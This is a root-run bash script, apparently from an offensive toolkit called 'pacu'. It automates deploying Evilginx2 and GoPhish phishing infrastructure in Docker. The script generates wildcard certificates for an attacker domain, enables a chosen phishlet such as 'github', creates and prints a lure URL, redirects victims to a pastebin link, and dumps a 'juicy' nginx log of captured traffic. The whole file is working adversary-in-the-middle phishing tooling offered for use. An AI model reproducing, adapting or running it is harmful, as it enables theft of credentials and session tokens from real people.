#!/bin/bash

if [[ $EUID -ne 0 ]]; then
   echo "UID != 0" 
   exit 1
fi

pacu_dir=/opt/pacu

function usage {
    echo "Usage: $0 -d example.org -p github           # Initializes Evilginx2" >&2
    echo "       $0 -d example.org -g url              # Initializes GoPhish" >&2
    echo "       $0 -d example.org -p github -g url    # Initializes Evilginx2 with GoPhish"
    echo "       $0 -d example.org -p github -g url -c # Enables support for Cloudflare while initializing"
    echo "       $0 evilmux                            # Gets into Evilginx2 tmux session" >&2
    echo "       $0 evilmux-print                      # Prints stdout from Evilginx2 tmux session" >&2
    echo "       $0 nginx-juice                        # Prints juicy log from NGiNX" >&2
    echo "       $0 nginx-stop                         # Stops NGiNX" >&2
    echo "       $0 nginx-start                        # Starts NGiNX" >&2
    echo "       $0 remove                             # Removes pacu" >&2
    echo "" >&2
}


function compose_down_up {
    cd $pacu_dir
    docker-compose down --remove-orphans
    docker-compose up -d    
}

setthatup() {

    if [ -z "$cloudflare" ]; then
    cloudflare="off"
    fi
    
    if [ "$cloudflare" = "on" ]; then
        sed -i '/real_ip/s/^#//g' $pacu_dir/nginx-proxy/nginx.tmpl
    fi
    
    if [ "$cloudflare" = "off" ]; then
        sed -e '/real_ip/ s/^#*/#/g' -i $pacu_dir/nginx-proxy/nginx.tmpl
    fi
    
    mkdir -p $pacu_dir/certs
    cd $pacu_dir/certs
    openssl genrsa 2048 > $domain.key
    openssl req -new -x509 -nodes -sha256 -days 365 -key $domain.key -out $domain.crt -subj "/C=US/ST=Oregon/L=Portland/CN=*.$domain"

    cp $pacu_dir/docker-compose.tmpl $pacu_dir/docker-compose.yml

    if ! [ -z "$phishlet" ] && ! [ -z "$gophish_host" ]; then
        pre-evilginx
        pre-gophish
        compose_down_up
        post-evilginx
        post-gophish
    elif ! [ -z "$phishlet" ]; then
        sed -i "38,51 {s/^/#/}" $pacu_dir/docker-compose.yml
        pre-evilginx
        compose_down_up
        post-evilginx
    elif ! [ -z "$gophish_host" ]; then
        sed -i "21,36 {s/^/#/}" $pacu_dir/docker-compose.yml
        pre-gophish
        compose_down_up
        post-gophish
    fi

    echo -n "Hosts : $evilginx_hosts"
    if ! [ -z "$gophish_host" ]; then
        echo -n ",$gophish_host.$domain"
    fi
    echo ""
}

pre-evilginx() {

    if [[ ! -f "$pacu_dir/evilginx/phishlets/$phishlet.yaml" ]]; then
        echo "Phishlet does not exist"
        exit 1
    fi
    num_sub=$(cat $pacu_dir/evilginx/phishlets/$phishlet.yaml | grep phish_sub | cut -d"'" -f 2 | sort -u | sed '/^$/d' | wc -l )
    for i in $(seq 1 $num_sub);
    do
      evilginx_hosts[i]=$(cat $pacu_dir/evilginx/phishlets/$phishlet.yaml | grep phish_sub | cut -d"'" -f 2 | sort -u | sed '/^$/d' | head -n $i | tail -n 1).$domain
    done
    evilginx_hosts[0]=$domain
    printf -v joined '%s,' "${evilginx_hosts[@]}"
    evilginx_hosts=`echo "${joined%,}"`
    sed -i "s/evilginx_hosts/$evilginx_hosts/g" $pacu_dir/docker-compose.yml

}

pre-gophish() {

    sed -i "s/gophish_host/$gophish_host.$domain/g" $pacu_dir/docker-compose.yml
    
}


post-evilginx() {

    tmux kill-session -t pacu
    tmux new-session -d -s pacu && tmux send-keys -t pacu "cd $pacu_dir/evilginx && ./evilginx" Enter
    sleep 3
    tmux send-keys -t pacu "config ip 0.0.0.0" Enter
    tmux send-keys -t pacu "config domain $domain" Enter
    tmux send-keys -t pacu "config redirect_url https://pastebin.com/raw/U40SDvzN" Enter
    tmux send-keys -t pacu "phishlets hostname $phishlet $domain" Enter
    tmux send-keys -t pacu "phishlets enable $phishlet" Enter
    tmux send-keys -t pacu "lures delete all" Enter
    tmux send-keys -t pacu "lures create $phishlet" Enter
    tmux send-keys -t pacu "lures get-url 0" Enter
    echo "*****************************************************************"
    echo -n "Lure  : "
    sleep 3
    tmux capture-pane -pt pacu -S -5 | grep -A2 get-url | tail -n 1
    echo "*****************************************************************"

}

post-gophish() {

    echo "">/dev/null
    
}

while getopts 'd:p:g:c' flag; do
    case "$flag" in
      d)
        domain=${OPTARG}
        ;;
      p)
        phishlet=${OPTARG}
        ;;
      g)
        gophish_host=${OPTARG}
        ;;
      c)
        cloudflare="on"
        ;;        
    esac
done

if [ "$1" = "nginx-stop" ]; then
    cd $pacu_dir
    docker-compose stop nginx-proxy
    exit 1
fi

if [ "$1" = "nginx-start" ]; then
    cd $pacu_dir
    docker-compose start nginx-proxy
    exit 1
fi

if [ "$1" = "nginx-juice" ]; then
    cat $pacu_dir/juice.log
    exit 1
fi

if [ "$1" = "evilmux" ]; then
    tmux a -t pacu
fi

if [ "$1" = "evilmux-print" ]; then
    tmux capture-pane -pt pacu -S -100000
    exit 1
fi

if [ "$1" = "remove" ]; then
    cd $pacu_dir
    docker-compose down --remove-orphans
    tmux kill-session -t pacu &>/dev/null
    rm -rf /opt/pacu && \
    rm -rf /usr/local/bin/pacu && \
    docker rmi evilginx gophish nginx-proxy -f && \
    exit 1
fi

if ! [ -z "$domain" ]; then
    setthatup
else
    usage
fi
